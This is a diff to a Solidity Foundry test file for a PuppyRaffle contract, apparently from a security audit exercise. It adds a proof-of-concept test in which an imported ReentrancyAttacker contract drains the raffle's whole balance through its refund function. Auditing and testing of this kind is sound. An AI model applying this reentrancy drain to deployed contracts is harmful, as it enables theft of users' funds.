@@ -4,6 +4,7 @@ pragma experimental ABIEncoderV2;
 
 import {Test, console2} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+import {ReentrancyAttacker} from "./mocks/ReentrancyAttacker.sol";
 
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
@@ -243,6 +244,30 @@ contract PuppyRaffleTest is Test {
         console2.log(gasCostSecond);
 
         // 2nd player should pay more gas than 1st player
-        assertTrue(gasCostSecond > gasCostFirst);
+        assertGt(gasCostSecond, gasCostFirst, "2nd player should pay more gas than 1st player");
+    }
+
+    function test_audit_refund_ExploitableWithReentrancy() public playersEntered {
+        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackerContractBalance = address(attacker).balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        console2.log("Starting attacker contract balance: ", startingAttackerContractBalance);
+        console2.log("Starting PuppyRaffle balance: ", startingPuppyRaffleBalance);
+
+        // Attack
+        vm.prank(attackUser);
+        attacker.attack{value: entranceFee}();
+
+        uint256 endingAttackerContractBalance = address(attacker).balance;
+        uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        console2.log("Ending attacker contract balance: ", endingAttackerContractBalance);
+        console2.log("Ending PuppyRaffle balance: ", endingPuppyRaffleBalance);
+
+        assertEq(endingAttackerContractBalance - entranceFee, startingPuppyRaffleBalance, "Attacker contract balance should be equal to starting PuppyRaffle balance");
     }
 }
